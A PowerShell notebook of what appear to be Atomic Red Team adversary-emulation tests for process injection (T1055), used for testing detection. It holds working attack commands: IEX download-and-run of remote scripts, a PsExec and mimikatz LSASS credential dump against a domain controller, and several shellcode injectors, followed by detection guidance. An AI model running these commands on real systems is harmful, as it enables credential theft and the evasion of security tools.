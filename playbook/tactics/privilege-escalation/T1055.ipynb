{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "a9aded7b",
   "metadata": {},
   "source": "# T1055 - Process Injection\nAdversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. "
  },
  {
   "cell_type": "markdown",
   "id": "3fd433bf",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "6985e78d",
   "metadata": {},
   "source": "### Atomic Test #1 - Shellcode execution via VBA\nThis module injects shellcode into a newly created process and executes. By default the shellcode is created,\nwith Metasploit, for use on x86-64 Windows 10 machines.\n\nNote: Due to the way the VBA code handles memory/pointers/injection, a 64bit installation of Microsoft Office\nis required.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: The 64-bit version of Microsoft Office must be installed\n\n##### Check Prereq Commands:\n```powershell\ntry {\n  $wdApp = New-Object -COMObject \"Word.Application\"\n  $path = $wdApp.Path\n  Stop-Process -Name \"winword\"\n  if ($path.contains(\"(x86)\")) { exit 1 } else { exit 0 }\n} catch { exit 1 }\n\n```\n##### Get Prereq Commands:\n```powershell\nWrite-Host \"You will need to install Microsoft Word (64-bit) manually to meet this requirement\"\n\n```\n##### Description: \"#{txt_path}\" must exist on disk at specified location\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\T1055\\src\\x64\\T1055-macrocode.txt\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1055\\src\\x64\\T1055-macrocode.txt\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055-macrocode.txt\" -OutFile \"PathToAtomicsFolder\\T1055\\src\\x64\\T1055-macrocode.txt\" -UseBasicParsing\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3cceae8b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1055 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "c97e374d",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1055\\src\\x64\\T1055-macrocode.txt\" -officeProduct \"Word\" -sub \"Execute\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "66c18ec1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1055 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "ef80c86e",
   "metadata": {},
   "source": "### Atomic Test #2 - Remote Process Injection in LSASS via mimikatz\nUse mimikatz to remotely (via psexec) dump LSASS process content for RID 500 via code injection (new thread).\nEspecially useful against domain controllers in Active Directory environments.\nIt must be executed in the context of a user who is privileged on remote `machine`.\n\nThe effect of `/inject` is explained in <https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html>\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n\n##### Check Prereq Commands:\n```cmd\n$mimikatz_path = cmd /c echo %tmp%\\mimikatz\\x64\\mimikatz.exe\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases -UseBasicParsing | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo %tmp%\\mimikatz\\x64\\mimikatz.exe\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n\n```\n##### Description: PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_path})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\") { exit 0} else { exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" -UseBasicParsing\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\" -Force\nNew-Item -ItemType Directory (Split-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\") -Force | Out-Null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a70c0ac0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1055 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "db1661c4",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" /accepteula \\\\DC1 -c %tmp%\\mimikatz\\x64\\mimikatz.exe \"lsadump::lsa /inject /id:500\" \"exit\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d9e92e53",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1055 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "4e3466b7",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Section View Injection",
    "This test creates a section object in the local process followed by a local section view.\nThe shellcode is copied into the local section view and a remote section view is created in the target process, pointing to the local section view. \nA thread is then created in the target process, using the remote section view as start address.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$notepad = Start-Process notepad -passthru\nStart-Process \"$PathToAtomicsFolder\\T1055\\bin\\x64\\InjectView.exe\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "200477fa",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1055 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "25128069",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nStop-Process $notepad.pid```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ec52d15a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1055 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "4e58a1d3",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - Dirty Vanity process Injection",
    "This test used the Windows undocumented remote-fork API RtlCreateProcessReflection to create a cloned process of the parent process\nwith shellcode written in its memory. The shellcode is executed after being forked to the child process. The technique was first presented at \nBlackHat Europe 2022. Shellcode will open a messsage box and a notepad.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nStart-Process \"$PathToAtomicsFolder\\T1055\\bin\\x64\\redVanity.exe\" (Start-Process calc.exe -PassThru).Id\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "71d6ecf8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1055 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "da729ee1",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nGet-Process -Name calc, CalculatorApp -ErrorAction SilentlyContinue | Stop-Process -Force```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4e381ae7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1055 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "cf188bfe",
   "metadata": {},
   "source": "### Atomic Test #5 - Read-Write-Execute process Injection\nThis test exploited the vulnerability in legitimate PE formats where sections have RWX permission and enough space for shellcode.\nThe RWX injection avoided the use of VirtualAlloc, WriteVirtualMemory, and ProtectVirtualMemory, thus evading detection mechanisms \nthat relied on API call sequences and heuristics. The RWX injection utilises API call sequences: LoadLibrary --> GetModuleInformation --> GetModuleHandleA --> RtlCopyMemory --> CreateThread.\nThe injected shellcode will open a message box and a notepad.\nRWX Process Injection, also known as MockingJay, was introduced to the security community by SecurityJoes.\nMore details can be found at https://www.securityjoes.com/post/process-mockingjay-echoing-rwx-in-userland-to-achieve-code-execution.\nThe original injector and idea were developed for game cheats, as visible at https://github.com/M-r-J-o-h-n/SWH-Injector.\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Utility to inject must exist on disk at specified location (#{vuln_dll})\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\T1055\\bin\\x64\\vuln_dll\\msys-2.0.dll\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1055\\bin\\x64\\vuln_dll\\msys-2.0.dll\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/bin/x64/vuln_dll/msys-2.0.dll\" -OutFile \"PathToAtomicsFolder\\T1055\\bin\\x64\\vuln_dll\\msys-2.0.dll\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1e0ce0bf",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1055 -TestNumbers 5 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "a125a21a",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$address = (& \"$PathToAtomicsFolder\\T1055\\bin\\x64\\searchVuln.exe\" \"$PathToAtomicsFolder\\T1055\\bin\\x64\\vuln_dll\\\" | Out-String | Select-String -Pattern \"VirtualAddress: (\\w+)\").Matches.Groups[1].Value\n& \"PathToAtomicsFolder\\T1055\\bin\\x64\\RWXinjectionLocal.exe\" \"PathToAtomicsFolder\\T1055\\bin\\x64\\vuln_dll\\msys-2.0.dll\" $address\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "76d7e1fa",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1055 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "d73a7afe",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nGet-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c9519c85",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1055 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "849c3308",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - Process Injection with Go using UuidFromStringA WinAPI",
    "Uses WinAPI UuidFromStringA to load shellcode to a memory address then executes the shellcode using EnumSystemLocalesA.\nWith this technique, memory is allocated on the heap and does not use commonly suspicious APIs such as VirtualAlloc, WriteProcessMemory, or CreateThread \n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode/tree/master#uuidfromstringa)\n- References: \n  - https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/\n  - https://twitter.com/_CPResearch_/status/1352310521752662018\n  - https://blog.securehat.co.uk/process-injection/shellcode-execution-via-enumsystemlocala\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$PathToAtomicsFolder\\T1055\\bin\\x64\\UuidFromStringA.exe -debug\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d33a0e22",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1055 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "41c1f8a1",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nStop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2564b471",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1055 -TestNumbers 6 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "059c3c34",
   "metadata": {},
   "source": [
    "### Atomic Test #7 - Process Injection with Go using EtwpCreateEtwThread WinAPI",
    "Uses EtwpCreateEtwThread function from ntdll.dll to execute shellcode within the application's process.\nThis program loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.\n\nSteps taken with this technique\n1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write\n2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space\n3. Change the memory page permissions to Execute/Read with VirtualProtect\n4. Call EtwpCreateEtwThread on shellcode address\n5. Call WaitForSingleObject so the program does not end before the shellcode is executed\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode/tree/master#EtwpCreateEtwThread)\n- References: \n  - https://gist.github.com/TheWover/b2b2e427d3a81659942f4e8b9a978dc3\n  - https://www.geoffchappell.com/studies/windows/win32/ntdll/api/etw/index.htm\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$PathToAtomicsFolder\\T1055\\bin\\x64\\EtwpCreateEtwThread.exe -debug\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cdaa4bd4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1055 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "9ee170b3",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nStop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8dc536d8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1055 -TestNumbers 7 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "9c22e0fc",
   "metadata": {},
   "source": [
    "### Atomic Test #8 - Remote Process Injection with Go using RtlCreateUserThread WinAPI",
    "Executes shellcode in a remote process.\n\nSteps taken with this technique\n1. Get a handle to the target process\n2. Allocate memory for the shellcode with VirtualAllocEx setting the page permissions to Read/Write\n3. Use the WriteProcessMemory to copy the shellcode to the allocated memory space in the remote process\n4. Change the memory page permissions to Execute/Read with VirtualProtectEx\n5. Execute the entrypoint of the shellcode in the remote process with RtlCreateUserThread\n6. Close the handle to the remote process\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode/tree/master#rtlcreateuserthread)\n- References: \n  - https://www.cobaltstrike.com/blog/cobalt-strikes-process-injection-the-details-cobalt-strike\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$process = Start-Process C:\\Windows\\System32\\werfault.exe -passthru\n$PathToAtomicsFolder\\T1055\\bin\\x64\\RtlCreateUserThread.exe -pid $process.Id -debug\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b2c78b9a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1055 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "9448112f",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nStop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\nStop-Process -Name werfault -ErrorAction SilentlyContinue\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "528ba678",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1055 -TestNumbers 8 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "cb208a9c",
   "metadata": {},
   "source": [
    "### Atomic Test #9 - Remote Process Injection with Go using CreateRemoteThread WinAPI",
    "Leverages the Windows CreateRemoteThread function from Kernel32.dll to execute shellocde in a remote process.\n\nThis application leverages functions from the golang.org/x/sys/windows package, where feasible, like the windows.OpenProcess().\n\nSteps taken with this technique\n1. Get a handle to the target process\n2. Allocate memory for the shellcode with VirtualAllocEx setting the page permissions to Read/Write\n3. Use the WriteProcessMemory to copy the shellcode to the allocated memory space in the remote process\n4. Change the memory page permissions to Execute/Read with VirtualProtectEx\n5. Execute the entrypoint of the shellcode in the remote process with CreateRemoteThread\n6. Close the handle to the remote process\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createremotethread)\n - References:\n  - https://www.ired.team/offensive-security/code-injection-process-injection/process-injection\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$process = Start-Process C:\\Windows\\System32\\werfault.exe -passthru\n$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateRemoteThread.exe -pid $process.Id -debug\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2d795944",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1055 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "c522c9e9",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nStop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\nStop-Process -Name werfault -ErrorAction SilentlyContinue\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a28dd378",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1055 -TestNumbers 9 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "7439ea4c",
   "metadata": {},
   "source": [
    "### Atomic Test #10 - Remote Process Injection with Go using CreateRemoteThread WinAPI (Natively)",
    "Leverages the Windows CreateRemoteThread function from Kernel32.dll to execute shellcode in a remote process.\n\nThis program loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.\n\n1. Get a handle to the target process\n2. Allocate memory for the shellcode with VirtualAllocEx setting the page permissions to Read/Write\n3. Use the WriteProcessMemory to copy the shellcode to the allocated memory space in the remote process\n4. Change the memory page permissions to Execute/Read with VirtualProtectEx\n5. Execute the entrypoint of the shellcode in the remote process with CreateRemoteThread\n6. Close the handle to the remote process\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createremotethreadnative)\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$process = Start-Process C:\\Windows\\System32\\werfault.exe -passthru\n$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateRemoteThreadNative.exe -pid $process.Id -debug\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d3547047",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1055 -TestNumbers 10"
  },
  {
   "cell_type": "markdown",
   "id": "258603a9",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nStop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\nStop-Process -Name werfault -ErrorAction SilentlyContinue\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "84b7dbc0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1055 -TestNumbers 10 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "2afd986a",
   "metadata": {},
   "source": [
    "### Atomic Test #11 - Process Injection with Go using CreateThread WinAPI",
    "This program executes shellcode in the current process using the following steps\n1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write\n2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space\n3. Change the memory page permissions to Execute/Read with VirtualProtect\n4. Call CreateThread on shellcode address\n5. Call WaitForSingleObject so the program does not end before the shellcode is executed\n\nThis program leverages the functions from golang.org/x/sys/windows to call Windows procedures instead of manually loading them\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createthread)\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateThread.exe -debug\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4f22d097",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1055 -TestNumbers 11"
  },
  {
   "cell_type": "markdown",
   "id": "9a2c9151",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nStop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "57b0b28a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1055 -TestNumbers 11 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "f0f8afa9",
   "metadata": {},
   "source": [
    "### Atomic Test #12 - Process Injection with Go using CreateThread WinAPI (Natively)",
    "This program executes shellcode in the current process using the following steps\n1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write\n2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space\n3. Change the memory page permissions to Execute/Read with VirtualProtect\n4. Call CreateThread on shellcode address\n5. Call WaitForSingleObject so the program does not end before the shellcode is executed\n\nThis program loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createthreadnative)\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateThreadNative.exe -debug\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "56280ca7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1055 -TestNumbers 12"
  },
  {
   "cell_type": "markdown",
   "id": "113e6592",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nStop-Process -Name CalculatorApp -ErrorAction SilentlyContinue```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0dd8b5a5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1055 -TestNumbers 12 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "18ff5463",
   "metadata": {},
   "source": "## Detection\nMonitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, <code>QueueUserAPC</code>/<code>NtQueueApcThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017) \n\nMonitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process. \n\nMonitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.(Citation: ArtOfMemoryForensics)  (Citation: GNU Acct)  (Citation: RHEL auditd)  (Citation: Chokepoint preload rootkits) \n\nMonitor for named pipe creation and connection events (Event IDs 17 and 18) for possible indicators of infected processes with external modules.(Citation: Microsoft Sysmon v6 May 2017) \n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. "
  },
  {
   "cell_type": "markdown",
   "id": "b70255be",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### Security Controls \n Alter security controls to make the system more or less vulnerable to attack. \n\n Manipulating security controls involves making configuration changes to the security settings of a system including things like modifying Group Policies, disabling/enabling autorun for removable media, and tightening or relaxing system firewalls, etc.\n#### Opportunity\nIn an adversary engagement scenario, there is an opportunity to implement security controls to support your defensive objectives over a prolonged engagement.\n#### Use Case\nA defender could implement security controls to have an effect on process injection techniques such as AppLocker or an Antivirus/EDR tool designed to watch for CreateRemoteThread events.\n#### Procedures\nWeaken security controls on a system to allow for leaking of credentials via network connection poisoning.\nImplement policies on a system to prevent the insecure storage of passwords in the registry. This may force an adversary to revert these changes or find another way to access cached credentials.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}